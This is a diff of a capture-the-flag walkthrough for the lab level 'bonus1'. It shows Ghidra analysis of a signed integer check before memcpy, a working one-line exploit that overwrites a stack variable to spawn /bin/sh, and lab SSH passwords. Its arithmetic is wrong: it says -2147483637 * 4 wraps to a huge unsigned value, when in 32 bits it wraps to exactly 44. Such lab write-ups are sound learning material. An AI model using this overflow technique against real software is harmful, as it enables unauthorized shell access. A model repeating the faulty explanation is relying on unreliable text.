@@ -3,55 +3,31 @@
    Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 
 2. Analyze the binary with Ghidra:
-   - Main function takes two arguments: argv[1] (integer) and argv[2] (data)
-   - Calls atoi(argv[1]) to convert first argument to signed integer (num)
-   - Checks if num <= 9 (signed comparison)
-   - Calls memcpy(buffer, argv[2], num * 4) - vulnerable to integer overflow!
-   - Buffer is 40 bytes at ESP+0x14
-   - Integer 'num' is stored at ESP+0x3c (40 bytes from buffer start)
+   - atoi(argv[1]) converts first argument to signed integer (num)
+   - Check: num <= 9 (signed comparison)
+   - memcpy(buffer, argv[2], num * 4) - num is signed but length is unsigned
+   - Integer overflow: negative num passes check, num * 4 wraps to large unsigned value
+   - Buffer: 40 bytes at ESP+0x14
+   - Variable num: stored at ESP+0x3c (44 bytes from buffer start)
    - Victory condition: if num == 0x574f4c46, executes /bin/sh
-   
-   Key vulnerability: num is SIGNED, but memcpy length is UNSIGNED
-   If num is negative, it passes the <= 9 check
-   When num * 4 is cast to size_t (unsigned), it wraps to huge positive value
 
-3. Calculate the exploit values:
-   Goal: Overflow 44 bytes (40 buffer + 4 to overwrite num)
-   
-   Integer overflow calculation:
-   - We need num < 10 (signed) to pass the check
-   - We need num * 4 >= 44 (unsigned) for memcpy to overflow
-   - Use negative wraparound: num = -2147483637 (0x8000000B)
-   
-   Check: -2147483637 < 10 ✅
-   Multiply: -2147483637 * 4 = wraps to large unsigned value ✅
-   
-   Payload for argv[2]:
-   - 40 bytes padding (fills buffer)
-   - 4 bytes: 0x574f4c46 in little-endian ("\x46\x4c\x4f\x57")
-   
-   Note: 0x574f4c46 = "FLOW" when read as ASCII (little-endian)
-
-4. Connect to the VM via SSH:
+3. Connect to the VM via SSH:
    ssh bonus1@localhost -p 2222
    Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 
+4. Calculate the exploit:
+   Goal: Overflow 44 bytes (40 buffer + 4 to overwrite num with 0x574f4c46)
+   
+   Use -2147483637 (0x8000000B):
+   - Passes signed check: -2147483637 <= 9 ✓
+   - Multiplication wraps: -2147483637 * 4 = large unsigned value ✓
+   
+   Payload structure:
+   - 40 bytes padding
+   - 4 bytes: 0x574f4c46 in little-endian (\x46\x4c\x4f\x57)
+
 5. Execute the exploit:
    ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
-   
-   Explanation:
-   - argv[1]: -2147483637 (passes signed check, causes overflow in multiplication)
-   - argv[2]: 40 padding bytes + magic value 0x574f4c46 (little-endian)
-   
-   What happens:
-   1. atoi("-2147483637") = -2147483637 (0x8000000B)
-   2. Check: -2147483637 <= 9 → TRUE ✅
-   3. memcpy(buffer, argv[2], -2147483637 * 4) 
-      → Integer overflow: -2147483637 * 4 wraps to huge unsigned value
-      → Copies way more than 44 bytes
-   4. Buffer overflow: overwrites 'num' at ESP+0x3c with 0x574f4c46
-   5. Check: num == 0x574f4c46 → TRUE ✅
-   6. execl("/bin/sh") executes → Shell spawned!
 
 6. Read the password:
    cat /home/user/bonus2/.pass
@@ -59,6 +35,4 @@
    Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 
 7. Exit and login as bonus2:
-   exit
-   ssh bonus2@localhost -p 2222
-   Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+   su bonus2
